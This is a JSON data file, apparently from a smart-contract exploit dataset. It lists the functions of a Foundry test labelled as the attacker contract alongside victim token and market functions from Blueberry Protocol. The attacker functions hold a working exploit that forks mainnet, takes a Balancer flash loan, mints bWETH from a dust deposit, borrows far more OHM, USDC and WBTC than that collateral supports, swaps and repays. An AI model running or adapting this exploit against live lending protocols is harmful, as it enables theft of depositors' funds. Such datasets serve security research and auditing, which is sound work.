[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        address[] memory tokenList = new address[](1);\n        tokenList[0] = address(bWETH);\n        BlueberryProtocol.enterMarkets(tokenList);\n        bWETH.mint(1_000_000_000_000_000_000);\n        bOHM.borrow(8_616_071_267_266);\n        bUSDC.borrow(913_262_603_416);\n        bWBTC.borrow(686_690_100);\n        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({\n            tokenIn: address(OHM),\n            tokenOut: address(WETH),\n            fee: 3000,\n            recipient: address(this),\n            deadline: type(uint256).max,\n            amountOut: 999_999_999_999_999_999,\n            amountInMaximum: type(uint256).max,\n            sqrtPriceLimitX96: 0\n        });\n        pool.exactOutputSingle(params);\n        WETH.transfer(address(balancer), 1_000_000_000_000_000_000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_287_289 - 1);\n        vm.label(address(this), \"AttackContract\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(OHM), \"OHM\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(bWETH), \"bWETH\");\n        vm.label(address(bOHM), \"bOHM\");\n        vm.label(address(bUSDC), \"bUSDC\");\n        vm.label(address(bWBTC), \"bWBTC\");\n\n        vm.label(address(BlueberryProtocol), \"BlueberryProtocol\");\n\n        vm.label(address(balancer), \"balancer\");\n        vm.label(address(pool), \"pool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testAttack",
    "original_code": "    function testAttack() public {\n        vm.deal(address(this), 0.000000000000009997 ether);\n        WETH.deposit{value: 0.000000000000009997 ether}();\n        approveAll();\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1_000_000_000_000_000_000;\n        balancer.flashLoan(address(this), tokens, amounts, new bytes(1)); // borrow BUSD\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "bBep20Interface",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address _spender, uint256 _value) public returns (bool) {\n    allowed[msg.sender][_spender] = _value;\n    emit Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "bBep20Interface",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address _owner) public view returns (uint256) {\n    return balances[_owner];\n  }\n\n}\n\n// File: openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "bBep20Interface",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint256 borrowAmount) external returns (uint256) {\n        borrowAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "bBep20Interface",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(\n    address _to,\n    uint256 _amount\n  )\n    public\n    hasMintPermission\n    canMint\n    returns (bool)\n  {\n    totalSupply_ = totalSupply_.add(_amount);\n    balances[_to] = balances[_to].add(_amount);\n    emit Mint(_to, _amount);\n    emit Transfer(address(0), _to, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "bBep20Interface",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "  function transfer(address _to, uint256 _value) public returns (bool) {\n    require(_value <= balances[msg.sender]);\n    require(_to != address(0));\n\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    emit Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "    function enterMarkets(address[] calldata bTokens)\n        external\n        returns (uint256[] memory);\n\n",
    "description": ""
  }
]